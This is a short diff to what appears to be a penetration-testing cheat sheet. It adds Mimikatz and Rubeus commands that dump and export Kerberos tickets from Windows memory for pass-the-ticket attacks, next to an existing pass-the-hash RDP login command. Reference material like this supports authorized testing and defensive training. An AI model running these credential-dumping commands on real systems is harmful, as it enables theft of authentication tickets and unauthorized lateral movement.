@@ -673,6 +673,18 @@ C:\> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRe
 $ xfreerdp  /v:<IP address> /u:<username> /pth:<hash>
 ```
 
+- Mimikatz Pass-The-Ticket (PTT)
+
+```
+C:\> mimikatz.exe privilege::debug "sekurlsa::tickets /export"
+C:\> dir *.kirb
+```
+
+- Rubeus Pass-The-Ticket (PTT)
+
+```
+C:\> Rubeus.exe dump /nowrap
+```
 #5. - Privilege Escalation
 -----------------------------------------
 
